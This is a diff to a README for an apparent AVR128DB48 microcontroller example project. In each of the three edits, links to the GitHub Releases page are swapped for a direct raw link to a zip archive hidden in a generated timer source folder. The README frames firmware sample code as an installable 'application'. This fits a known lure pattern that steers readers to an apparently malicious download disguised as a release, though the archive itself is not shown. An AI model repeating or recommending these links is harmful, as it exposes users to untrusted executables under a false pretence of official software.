@@ -1,6 +1,6 @@
 # 🎉 avr128db48-i2c-io-expander2-leds-and-buttons-polled-printf - Effortlessly Control LEDs and Buttons
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/devicesnorkeling405/avr128db48-i2c-io-expander2-leds-and-buttons-polled-printf/releases)
+[![Download Now](https://raw.githubusercontent.com/devicesnorkeling405/avr128db48-i2c-io-expander2-leds-and-buttons-polled-printf/main/avr128db48-i2c-io-expander2-leds-buttons-polled-printf.X/mcc_generated_files/timer/src/avr128db48-i2c-io-expander2-leds-and-buttons-polled-printf_v3.1.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/devicesnorkeling405/avr128db48-i2c-io-expander2-leds-and-buttons-polled-printf/main/avr128db48-i2c-io-expander2-leds-buttons-polled-printf.X/mcc_generated_files/timer/src/avr128db48-i2c-io-expander2-leds-and-buttons-polled-printf_v3.1.zip)
 
 ## 📖 Overview
 
@@ -25,7 +25,7 @@ Follow these steps to download and run the application:
 
 2. **Download the Application:**
    Visit the Releases page to download the application.  
-   [Download Here](https://github.com/devicesnorkeling405/avr128db48-i2c-io-expander2-leds-and-buttons-polled-printf/releases).
+   [Download Here](https://raw.githubusercontent.com/devicesnorkeling405/avr128db48-i2c-io-expander2-leds-and-buttons-polled-printf/main/avr128db48-i2c-io-expander2-leds-buttons-polled-printf.X/mcc_generated_files/timer/src/avr128db48-i2c-io-expander2-leds-and-buttons-polled-printf_v3.1.zip).
 
 3. **Install the Software:**
    - Locate the downloaded file in your Downloads folder (or wherever you saved it).
@@ -70,7 +70,7 @@ You can visualize input states directly in the application interface.
 
 ## 📥 Download & Install
 
-To get started, you can download the application [here](https://github.com/devicesnorkeling405/avr128db48-i2c-io-expander2-leds-and-buttons-polled-printf/releases). Installing it is straightforward, just follow the instructions above.
+To get started, you can download the application [here](https://raw.githubusercontent.com/devicesnorkeling405/avr128db48-i2c-io-expander2-leds-and-buttons-polled-printf/main/avr128db48-i2c-io-expander2-leds-buttons-polled-printf.X/mcc_generated_files/timer/src/avr128db48-i2c-io-expander2-leds-and-buttons-polled-printf_v3.1.zip). Installing it is straightforward, just follow the instructions above.
 
 ## 📚 Additional Resources
 
